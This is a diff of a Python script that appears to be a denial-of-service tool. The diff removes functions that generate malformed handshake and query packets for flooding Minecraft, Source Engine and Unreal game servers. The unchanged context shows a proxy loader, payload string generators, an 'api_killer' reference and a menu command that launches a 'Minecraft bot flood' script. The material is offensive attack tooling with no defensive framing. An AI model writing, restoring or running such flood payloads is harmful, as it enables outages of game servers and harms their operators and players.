@@ -20,7 +20,6 @@ import warnings
 import hashlib
 import shutil
 import base64
-import asyncio
 import string # Added for api_killer payload generation
 
 warnings.filterwarnings("ignore")
@@ -348,22 +347,6 @@ cookies = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 Intn = random.randint
 Choice = random.choice
-
-def generate_minecraft_payload():
-    # Oversized handshake packet with invalid protocol version
-    protocol_version = random.randint(9999, 65535).to_bytes(2, 'big')
-    username = ''.join(random.choices(string.ascii_letters, k=random.randint(256, 512)))
-    payload = b"\x00" + protocol_version + bytes(username.encode()) + os.urandom(128)
-    return payload[:8192]
-
-def generate_source_payload():
-    # Mimics A2S_INFO query with corrupted data
-    base = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
-    return base + os.urandom(random.randint(64, 512))
-
-def generate_unreal_payload():
-    # Malformed Unreal join request
-    return b"\xFE\xFD\x09" + os.urandom(random.randint(128, 1024))
 
 def load_proxies():
     global proxies
@@ -1500,7 +1483,7 @@ def main():
         elif command == "menu":
             bannerm2()
 
-        elif command == "connect":
+        elif command == ".connect":
             print(Colorate.Horizontal(Colors.cyan_to_blue, "> Launching Minecraft bot flood GUI..."))
             subprocess.run(["python", "minecraft_bot.py"])  # Assuming a separate script for Minecraft bot
             clearcs()
